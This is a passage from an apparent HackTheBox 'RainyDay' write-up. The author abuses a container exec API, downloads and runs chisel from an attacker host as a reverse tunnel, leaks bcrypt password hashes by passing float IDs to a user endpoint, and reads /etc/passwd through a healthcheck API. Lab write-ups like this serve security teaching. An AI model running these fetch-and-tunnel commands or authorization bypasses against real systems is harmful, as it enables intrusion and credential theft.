<span class="mtk1">            data[</span><span class="mtk4">'action'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">action_name</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7">prompt</span><span class="mtk1">(</span><span class="mtk4">"Enter Command: "</span><span class="mtk1">)</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk1">responseType</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'blob'</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">onload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> (</span><span class="mtk9 mtki">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">blob</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">e</span><span class="mtk1">.</span><span class="mtk7">currentTarget</span><span class="mtk1">.response;</span>
<span class="mtk1">            </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">contentDispo</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">e</span><span class="mtk1">.</span><span class="mtk7">currentTarget</span><span class="mtk1">.</span><span class="mtk8">getResponseHeader</span><span class="mtk1">(</span><span class="mtk4">'Content-Disposition'</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk3">// </span><span class="mtk3 detected-link">https://stackoverflow.com/a/23054920/</span>
<span class="mtk1">            </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">fileName</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">contentDispo</span><span class="mtk1">.</span><span class="mtk8">match</span><span class="mtk1">(</span><span class="mtk4">/filename</span><span class="mtk6">[</span><span class="mtk5">^</span><span class="mtk6">;=\n]</span><span class="mtk5">*</span><span class="mtk4">=((</span><span class="mtk6">['"]</span><span class="mtk4">)</span><span class="mtk6">.</span><span class="mtk5">*?\2|</span><span class="mtk6">[</span><span class="mtk5">^</span><span class="mtk6">;\n]</span><span class="mtk5">*</span><span class="mtk4">)/</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">];</span>  
<span class="mtk1">            </span><span class="mtk8">saveBlob</span><span class="mtk1">(</span><span class="mtk1">blob</span><span class="mtk1">, </span><span class="mtk1">fileName</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk9 mtki">ctx</span><span class="mtk1">.disabled </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk1">location</span><span class="mtk1">.</span><span class="mtk8">reload</span><span class="mtk1">();</span>
<span class="mtk1">        }</span>

<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> </span>
<span class="mtk1">    {</span>
<span class="mtk1">        </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">onload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> (</span><span class="mtk9 mtki">e</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk9 mtki">ctx</span><span class="mtk1">.disabled </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">action_name</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">"create"</span><span class="mtk1">))</span>
<span class="mtk1">            {</span>
<span class="mtk1">                </span><span class="mtk1">location</span><span class="mtk1">.</span><span class="mtk1">href</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/containers"</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">else</span>
<span class="mtk1">            {</span>
<span class="mtk1">                </span><span class="mtk1">location</span><span class="mtk1">.</span><span class="mtk8">reload</span><span class="mtk1">();</span>
<span class="mtk1">            }</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">URLSearchParams</span><span class="mtk1">(data).</span><span class="mtk8">toString</span><span class="mtk1">())</span>
<span class="mtk1">}</span>
</code></pre></div><p>Basically, we can interact with containers using an <code>id</code> and an <code>action</code>. We can also see another debug message.</p><p>Since we have access as <code>gary</code>, we can take a look at <code>/containers</code>:</p><p><img alt="RainyDay 7" src="/images/HTB/RainyDay/RainyDay-7.webp"></p><p>Let&rsquo;s create a new <code>alpine</code> container called <code>test</code>:</p><p><img alt="RainyDay 8" src="/images/HTB/RainyDay/RainyDay-8.webp"></p><p><img alt="RainyDay 9" src="/images/HTB/RainyDay/RainyDay-9.webp"></p><p>In the HTML code of the website we see the interaction with JavaScript using <code>stop</code>, <code>exec</code>, <code>execdetach</code> and <code>logs</code> actions. Moreover, we have the <code>id</code> of the container:</p><p><img alt="RainyDay 10" src="/images/HTB/RainyDay/RainyDay-10.webp"></p><p>Furthermore, we can confirm that the web technology is Flask, since we have a typical Flask session cookie:</p><p><img alt="RainyDay 10" src="/images/HTB/RainyDay/RainyDay-11.webp"></p><p>This cookie only holds our username:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> -d -c eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0tEKA.96Pgi_pmEs4SXG4CSpq_wvAQ31w  
{'username': 'gary'}
</code></pre></div><p>Unfortunately, the secret key that signs cookies is not crackable with <code>rockyou.txt</code> and <a href="https://pypi.org/project/flask-unsign/"><code>flask-unsign</code></a>.</p><h3 id="container-enumeration">Container enumeration</h3><p>Let&rsquo;s try to execute commands in the new Docker container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> cookie=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0tEKA.96Pgi_pmEs4SXG4CSpq_wvAQ31w

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers --data-urlencode <span class="code-dark-yellow">"action=execls"</span> -d <span class="code-dark-yellow">'id=b420a98bd8eafcb1f35e5d91258172caa51db54a60f0e8262086e3ca5f357188'</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span>  
bin
dev
etc
home
lib
logfile
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</code></pre></div><p>We can wrap the above command in a function in order to work better:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> exec_cmd<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers --data-urlencode <span class="code-dark-yellow">"action=exec<span class="code-dark-cyan">$1</span>"</span> -sd <span class="code-dark-yellow">'id=b420a98bd8eafcb1f35e5d91258172caa51db54a60f0e8262086e3ca5f357188'</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>" }</span>  

<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la'</span>
total 64
drwxr-xr-x    1 root     root          4096 Oct 15 23:40 .
drwxr-xr-x    1 root     root          4096 Oct 15 23:40 ..
-rwxr-xr-x    1 root     root             0 Oct 15 23:40 .dockerenv
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 bin
drwxr-xr-x   15 root     root          3860 Oct 15 23:40 dev
drwxr-xr-x    1 root     root          4096 Oct 15 23:40 etc
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 home
drwxr-xr-x    7 root     root          4096 Sep 29 13:47 lib
-rwxrwxrwx    1 root     root             0 Oct 15 23:40 logfile
drwxr-xr-x    5 root     root          4096 Sep 29 13:47 media
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 mnt
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 opt
dr-xr-xr-x  287 root     root             0 Oct 15 23:40 proc
drwx------    2 root     root          4096 Sep 29 13:47 root
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 run
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 sbin
drwxr-xr-x    2 root     root          4096 Sep 29 13:47 srv
dr-xr-xr-x   13 root     root             0 Oct 15 23:40 sys
drwxrwxrwt    2 root     root          4096 Sep 29 13:47 tmp
drwxr-xr-x    7 root     root          4096 Sep 29 13:47 usr
drwxr-xr-x   12 root     root          4096 Sep 29 13:47 var
</code></pre></div><p>We can enumerate running processes as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ps -a'</span>
PID   USER     TIME  COMMAND
    1 root      0:04 {systemd} /sbin/init
    2 root      0:00 [kthreadd]

...

  453 root      0:01 [jbd2/dm-0-8]
  454 root      0:00 [ext4-rsv-conver]
  514 root      1:39 /lib/systemd/systemd-journald
  545 root      0:00 [ipmi-msghandler]
  551 root      0:00 [kaluad]
  552 root      0:00 [kmpath_rdacd]
  554 root      0:00 [kmpathd]
  556 root      0:00 [kmpath_handlerd]
  558 root      0:08 /sbin/multipathd -d -s
  560 root      0:00 /lib/systemd/systemd-udevd
  579 101       0:01 /lib/systemd/systemd-networkd
  653 root      0:00 [nfit]
  748 root      0:00 [jbd2/sda2-8]
  749 root      0:00 [ext4-rsv-conver]
  763 102       0:10 /lib/systemd/systemd-resolved
  764 104       0:03 /lib/systemd/systemd-timesyncd
  783 root      0:00 /usr/bin/VGAuthService
  786 root      1:34 /usr/bin/vmtoolsd
  809 root      0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
  853 103       0:00 {dbus-daemon} @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  858 root      0:03 /usr/sbin/irqbalance --foreground
  861 root      0:00 {networkd-dispat} /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
  862 root      0:00 /usr/libexec/polkitd --no-debug
  863 107       0:50 /usr/sbin/rsyslogd -n -iNONE
  864 root      0:04 /usr/lib/snapd/snapd
  865 root      0:00 /lib/systemd/systemd-logind
  866 root      0:00 /usr/libexec/udisks2/udisksd
  886 root      0:00 /usr/sbin/ModemManager
 1189 root      0:00 /usr/sbin/cron -f -P
 1190 1000      0:00 sleep 100000000
 1203 root      1:08 /usr/bin/containerd
 1214 root      0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
 1220 root      0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
 1237 root      0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
 1238 xfs       2:52 nginx: worker process
 1239 xfs       3:23 nginx: worker process
 1255 root      0:28 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
 1473 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 49153 -container-ip 172.18.0.2 -container-port 40001
 1478 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 49153 -container-ip 172.18.0.2 -container-port 40001
 1492 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 40000 -container-ip 172.18.0.2 -container-port 40000
 1498 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 40000 -container-ip 172.18.0.2 -container-port 40000
 1514 root      0:10 /usr/bin/containerd-shim-runc-v2 -namespace moby -id c0fe876cc336487fb0bf8e28e08538a6dff303eb21ce58051015fb1eec4dded8 -address /run/containerd/containerd.sock  
 1536 root      0:03 tail -f /logfile
 1610 1001      1h02 /usr/local/bin/uwsgi --ini rainycloud.ini --threads 10
 4165 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 40001 -container-ip 172.18.0.3 -container-port 40001
 4171 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 40001 -container-ip 172.18.0.3 -container-port 40001
 4197 root      0:11 /usr/bin/containerd-shim-runc-v2 -namespace moby -id b420a98bd8eafcb1f35e5d91258172caa51db54a60f0e8262086e3ca5f357188 -address /run/containerd/containerd.sock
 4230 root      0:02 tail -f /logfile
15057 root      0:00 [kworker/u256:2-]
15143 root      0:00 [kworker/0:1-eve]
15146 root      0:00 [kworker/1:1-rcu]
15180 root      0:00 [kworker/0:0-cgr]
15197 root      0:00 [kworker/u256:0-]
15206 root      0:00 [kworker/1:0-rcu]
15262 root      0:00 [kworker/0:2]
15263 root      0:00 [kworker/u256:1-]
15274 root      0:00 [kworker/1:2-eve]
15276 1337      0:00 ps -a
15284 1337      0:00 timeout 5s ps -a
</code></pre></div><p>Here we see some interesting things:</p><ul><li><code>c0fe876cc336487f...</code> is the <code>id</code> for <code>jack</code>&rsquo;s container named <code>secrets</code>. Its IP address is <code>172.18.0.2</code></li><li>There are some ports opened in the main machine: 40000, 40001 and 49153. We have connection with the machine from <code>172.18.0.1</code></li><li>Our IP address is <code>172.18.0.3</code></li><li>A process from the machine is <code>/usr/local/bin/uwsgi --ini rainycloud.ini --threads 10</code>, which runs the production web server using Flask</li></ul><p>We cannot connect to the other container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers -d <span class="code-dark-yellow">'id=c0fe876cc336487fb0bf8e28e08538a6dff303eb21ce58051015fb1eec4dded8'</span> --data-urlencode <span class="code-dark-yellow">"action=execls"</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span>  
Unauthorized
</code></pre></div><h3 id="accessing-the-development-environment">Accessing the development environment</h3><p>We need to remember that there was a subdomain that blocks our external IP address, but we can access from inside the container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'wget -qO- --header="Host: dev.rainycloud.htb" 172.18.0.1'</span>
&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  ...
  &lt;body&gt;

    &lt;nav class="navbar navbar-expand-md navbar-light fixed-top bg-light"&gt;
      &lt;a class="navbar-brand" href="/"&gt;RainyCloud&lt;/a&gt; &lt;img src="img/cloud-service.png"&gt;&lt;/img&gt;
      ...
    &lt;/nav&gt;

    &lt;main role="main"&gt;

      &lt;div class="jumbotron"&gt;
        &lt;div class="container"&gt;
          &lt;h1 class="display-3"&gt;Welcome to RainyCloud (Dev)!&lt;/h1&gt;
          &lt;p&gt;Rainycloud is the simple hosting service that you need! Simply register and start a docker container at the click of a button!&lt;/p&gt;
          WARNING: This tool is still in beta. The features coming in the next release include better command execution, better log viewing and an accessible and documented REST API.  
        &lt;/div&gt;
      &lt;/div&gt;

      &lt;div class="container"&gt;
        &lt;!-- Example row of columns --&gt;
        &lt;div class="row"&gt;
          &lt;div class="col-md-4"&gt;
            &lt;h2&gt; Online Containers&lt;/h2&gt;
            &lt;table class="table"&gt;
                &lt;thead&gt;
                    &lt;th scope="col"&gt;Container Name&lt;/th&gt;
                    &lt;th scope="col"&gt;Image Name&lt;/th&gt;
                    &lt;th scope="col"&gt;User&lt;/th&gt;
                &lt;/thead&gt;
                &lt;tbody&gt;

                    &lt;tr&gt;
                      &lt;td&gt;test&lt;/td&gt;
                      &lt;td&gt;alpine:latest&lt;/td&gt;
                      &lt;td&gt;gary&lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;td&gt;secrets&lt;/td&gt;
                      &lt;td&gt;alpine-python:latest&lt;/td&gt;
                      &lt;td&gt;jack&lt;/td&gt;
                    &lt;/tr&gt;

                &lt;/tbody&gt;
            &lt;/table&gt;
          &lt;/div&gt;
          &lt;div class="col-md-4"&gt;

          &lt;/div&gt;
          ...
        &lt;/div&gt;

        &lt;hr&gt;

      &lt;/div&gt; &lt;!-- /container --&gt;

    &lt;/main&gt;

    &lt;footer class="container"&gt;
      &lt;p&gt;&copy; Company 2017-2018&lt;/p&gt;
    &lt;/footer&gt;

    ...
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>There we have it. At this point, it will be nice to download <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> in the container and perform a port forwarding in order to view the website in the browser. When downloaded, we can run it in detached mode using <code>execdetach</code> command (we can abuse the <code>exec_cmd</code> function for that):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'wget -qO /tmp/.chisel 10.10.17.44/chisel'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'chmod +x /tmp/.chisel'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'detach/tmp/.chisel client 10.10.17.44:1234 R:80:172.18.0.1:80'</span>  
Success
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.184 - - [] "GET /chisel HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

<span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server -p 1234 --reverse
server: Reverse tunnelling enabled
server: Fingerprint 2v6LdPLlcUWC6gh6Di2QZgYLGvH6Kfvr0RjMF5WYaR8=  
server: Listening on http://0.0.0.0:1234
server: session#1: tun: proxy#R:80=&gt;172.18.0.1:80: Listening
</code></pre></div><p>Now, we need to set <code>dev.rainycloud.htb</code> to point to <code>127.0.0.1</code> in <code>/etc/hosts</code>. Then, we have this development website:</p><p><img alt="RainyDay 12" src="/images/HTB/RainyDay/RainyDay-12.webp"></p><h3 id="api-enumeration">API enumeration</h3><p>There are some hints that point to an API. If we add a trailing slash to the <code>ffuf</code> command, we will see that it is another available route:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://dev.rainycloud.htb/FUZZ/  
<span class="code-dark-green">api                     [Status: 200, Size: 649, Words: 105, Lines: 24, Duration: 78ms]</span>
<span class="code-dark-green">                        [Status: 200, Size: 4574, Words: 1172, Lines: 116, Duration: 79ms]</span>
</code></pre></div><p>Actually, it also works for <code>rainycloud.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/
&lt;h1&gt; API v0.1 &lt;/h1&gt;
Welcome to the RainyCloud dev API. This is UNFINISHED and should not be used without permission.
&lt;table&gt;
  &lt;tr&gt;
    &lt;th&gt;Endpoint&lt;/th&gt;
    &lt;th&gt;Description&lt;/th&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;pre&gt;/api/&lt;/pre&gt;&lt;/td&gt;
    &lt;td&gt;This page&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;pre&gt;/api/list&lt;/pre&gt;&lt;/td&gt;
    &lt;td&gt;Lists containers&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;pre&gt;/api/healthcheck&lt;/pre&gt;&lt;/td&gt;
    &lt;td&gt;Checks the health of the website (path, type and pattern parameters only available internally)&lt;/td&gt;  
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;pre&gt;/api/user/&lt;id&gt;&lt;/pre&gt;&lt;/td&gt;
    &lt;td&gt;Gets information about the given user. Can only view current user information&lt;/td&gt;
  &lt;/tr&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/ -s | <span class="code-dark-green">md5sum</span>
5caace956c65ddc00f3cd166d83a3327  -

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/ -s | <span class="code-dark-green">md5sum</span>
5caace956c65ddc00f3cd166d83a3327  -
</code></pre></div><p>Here we can interact a bit with the API:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/list -s | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
  <span class="code-blue">"secrets"</span><span class="code-white">: {</span>
    <span class="code-blue">"image"</span><span class="code-white">: </span><span class="code-dark-green">"alpine-python:latest"</span><span class="code-white">,</span>
    <span class="code-blue">"user"</span><span class="code-white">: </span><span class="code-dark-green">"jack"</span>
  <span class="code-white">},</span>
  <span class="code-blue">"test"</span><span class="code-white">: {</span>
    <span class="code-blue">"image"</span><span class="code-white">: </span><span class="code-dark-green">"alpine:latest"</span><span class="code-white">,</span>
    <span class="code-blue">"user"</span><span class="code-white">: </span><span class="code-dark-green">"gary"</span>
  <span class="code-white">}</span>
<span class="code-white">}</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/healthcheck -s | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
  <span class="code-blue">"result"</span><span class="code-white">: </span>true<span class="code-white">,</span>
  <span class="code-blue">"results"</span><span class="code-white">: []</span>
<span class="code-white">}</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/0 -s | <span class="code-dark-green">jq</span>
<span class="code-white">{}</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/1 -s | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
  <span class="code-blue">"Error"</span><span class="code-white">: <span class="code-dark-green">"Not allowed to view other users info!"</span>  
<span class="code-white">}</span>
</code></pre></div><p>We see that we cannot list other user&rsquo;s information. But we can trick the server and use floating values to bypass the verification:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/1.0 -s | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
  <span class="code-blue">"id"</span><span class="code-white">: </span>1<span class="code-white">,</span>
  <span class="code-blue">"password"</span><span class="code-white">: </span><span class="code-dark-green">"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O"</span><span class="code-white">,</span>  
  <span class="code-blue">"username"</span><span class="code-white">: </span><span class="code-dark-green">"jack"</span>
<span class="code-white">}</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/2.0 -s | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
  <span class="code-blue">"id"</span><span class="code-white">: </span>2<span class="code-white">,</span>
  <span class="code-blue">"password"</span><span class="code-white">: </span><span class="code-dark-green">"$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W"</span><span class="code-white">,</span>
  <span class="code-blue">"username"</span><span class="code-white">: </span><span class="code-dark-green">"root"</span>
<span class="code-white">}</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/3.0 -s | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
  <span class="code-blue">"id"</span><span class="code-white">: </span>3<span class="code-white">,</span>
  <span class="code-blue">"password"</span><span class="code-white">: </span><span class="code-dark-green">"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG"</span><span class="code-white">,</span>
  <span class="code-blue">"username"</span><span class="code-white">: </span><span class="code-dark-green">"gary"</span>
<span class="code-white">}</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/4.0 -s | <span class="code-dark-green">jq</span>
<span class="code-white">{}</span>
</code></pre></div><p>There we have some hashed passwords (in <code>bcrypt</code> format). I guess that the intended way to get <code>gary</code>&rsquo;s password is to crack the hash using <code>john</code> or <code>hashcat</code>.</p><p>We can find some differences in <code>dev.rainycloud.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -s | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
  <span class="code-blue">"result"</span><span class="code-white">: </span>true<span class="code-white">,</span>
  <span class="code-blue">"results"</span><span class="code-white">: [</span>
<span class="code-white">    {</span>
      <span class="code-blue">"file"</span><span class="code-white">: <span class="code-dark-green">"/bin/bash"</span><span class="code-white">,</span>
      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
        <span class="code-blue">"type"</span><span class="code-white">: <span class="code-dark-green">"ELF"</span></span>
<span class="code-white">      }</span>
<span class="code-white">    },</span>
<span class="code-white">    {</span>
      <span class="code-blue">"file"</span><span class="code-white">: </span><span class="code-dark-green">"/var/www/rainycloud/app.py"</span><span class="code-white">,</span>
      <span class="code-blue">"pattern"</span><span class="code-white">: </span>{</span>
        <span class="code-blue">"type"</span><span class="code-white">: </span><span class="code-dark-green">"PYTHON"</span>
<span class="code-white">      }</span>
<span class="code-white">    },</span>
<span class="code-white">    {</span>
      <span class="code-blue">"file"</span><span class="code-white">: </span><span class="code-dark-green">"/var/www/rainycloud/sessions/db.sqlite"</span><span class="code-white">,</span>  
      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
        <span class="code-blue">"type"</span><span class="code-white">: </span><span class="code-dark-green">"SQLITE"</span></span>
<span class="code-white">      }</span>
<span class="code-white">    },</span>
<span class="code-white">    {</span>
      <span class="code-blue">"file"</span><span class="code-white">: </span><span class="code-dark-green">"/etc/passwd"</span><span class="code-white">,</span>
      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
        <span class="code-blue">"pattern"</span><span class="code-white">: </span><span class="code-dark-green">"^root.*"</span><span class="code-white">,</span>
        <span class="code-blue">"type"</span><span class="code-white">: </span><span class="code-dark-green">"CUSTOM"</span>
<span class="code-white">      }</span>
<span class="code-white">    }</span>
<span class="code-white">  ]</span>
<span class="code-white">}</span>
</code></pre></div><p>Since it is an API, we can try sending POST requests:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">''</span>
POST only allowed from internal systems

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">''</span>
Unauthenticated

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">''</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span>  
ERROR - missing parameter
</code></pre></div><h2 id="foothold">Foothold</h2><p>We are only allowed to send POST requests in the development environment, and using the session cookie. After some guessing and trial and error, we have a successful output:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/etc/passwd&pattern=root&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span>  
<span class="code-white">{</span>
  <span class="code-blue">"result"</span><span class="code-white">: </span>true<span class="code-white">,</span>
  <span class="code-blue">"results"</span><span class="code-white">: [</span>
    {</span>
<span class="code-white">      <span class="code-blue">"file"</span><span class="code-white">: <span class="code-dark-green">"/etc/passwd"</span><span class="code-white">,</span>
      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
        <span class="code-blue">"pattern"</span><span class="code-white">: <span class="code-dark-green">"root"</span><span class="code-white">,</span>
